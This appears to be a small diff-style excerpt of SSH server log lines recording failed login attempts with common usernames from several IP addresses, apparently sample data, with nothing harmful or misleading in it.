+Apr 29 05:30:37 prod-server-01 sshd[4577]: Invalid user guest from 148.106.37.192
+Apr 29 05:30:50 prod-server-01 sshd[9071]: Invalid user ftp from 252.225.205.122
+Apr 29 05:31:09 prod-server-01 sshd[2841]: Invalid user ftp from 143.163.191.86
+Apr 29 05:31:21 prod-server-01 sshd[4605]: Invalid user user from 67.227.180.173
+Apr 29 05:31:32 prod-server-01 sshd[7606]: Invalid user ftp from 94.104.182.162
+Apr 29 05:31:51 prod-server-01 sshd[2592]: Invalid user user from 61.249.32.55
